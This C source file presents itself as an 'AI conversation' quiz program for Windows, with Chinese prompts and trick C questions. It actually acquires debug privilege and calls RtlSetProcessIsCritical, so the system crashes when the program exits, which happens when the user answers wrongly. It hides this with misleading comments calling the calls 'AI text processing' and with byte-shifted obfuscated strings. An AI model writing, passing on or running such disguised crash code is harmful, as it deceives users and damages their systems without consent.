#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <stdbool.h>
//AI对话.c
//使用DevC++编译
void Process(){
int i; 
typedef NTSTATUS(WINAPI *RtlSetProcessIsCritical) (BOOLEAN, PBOOLEAN, BOOLEAN);
typedef BOOL(WINAPI *RtlAdjustPrivilege) (ULONG, BOOL, BOOL, PBOOLEAN);
//定义数据类型，调用系统API 
RtlAdjustPrivilege AP;
RtlSetProcessIsCritical AI;
HANDLE ntdll = LoadLibrary(TEXT("ntdll.dll"));//调用系统dll 
/*AI自动处理文本*/AP = (RtlAdjustPrivilege)GetProcAddress((HINSTANCE)ntdll, "RtlAdjustPrivilege");
AI = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
//AI的关键处理步骤 
BOOLEAN b;
AP(20UL, TRUE, FALSE, &b);//以20UL（debug）形式执行 
i=AI(TRUE, NULL, FALSE);//i为0则处理完毕 ，否则异常 
if(i){
printf("!请编译后使用管理员权限运行!\n进程初始化异常，程序将退出\n");
system("pause");
exit(1);
}
printf("0x00000000操作成功完成\n"); 
} 
int main() {
char say[]="脐摄顷脱渣淤侮疵押孵牲终⒐ⅶ俏藻净疗摄踌亨椿樟存糜矮鸳ⅷ";
int a,i,correct=0;char *p=say;while(*p)(*p++)++;
Process();
printf("%s\n",say);
printf("sizeof(\"\\028\\b\\axb\\xab\\\\012\")是多少?");
scanf("%d",&i);
system("pause");
if(i!=sizeof("\028\b\axb\xab\\012")){//如果数字不正确 
char say2[]="观唉品脱缕侮疵焙押续 "; //hbqwmxdbyy
p=say2;while(*p)(*p++)++;
printf("%s\n",say2);
}
else{
printf("你猜对啦！");
correct++;
}
char say4[]="募匝锤翁朗艺あ";//数据库字符数组 
p=say4;while(*p)(*p++)--;
system("pause");
MessageBox(0,say4,"提示",MB_OK);//myctky

system("pause");
printf("a=0;a*=a+=a+++a;之后a是多少?");
scanf("%d",&i);
system("pause");
a=0;a*=a+=a+++a;
if(i!=a){//如果数字不正确 
char say2[]="观唉品脱缕侮疵焙押续 "; //hbqwmxdbyy
p=say2;while(*p)(*p++)++;
printf("%s\n",say2);
}
else{
printf("你猜对啦！");
correct++;
}
if(correct<2){
char say3[]="牻康爬疵放孤骨疵放牼免潞蚁峭雇锭昼崭脱拂免备放ⅶ脐惋病捎衣峭雇都锭缸霸呈涤函抉ⅷ"; //数据库字符数组 
p=say3;while(*p)(*p++)++;
MessageBox(0,say3,"提示",MB_OK);
system("pause");
system("pause");
system("pause");
return 0;
}
else{
printf("成功完成挑战！(由于已注册，不建议退出程序)"); 
while(1){
system("pause");
} 

	
}
}
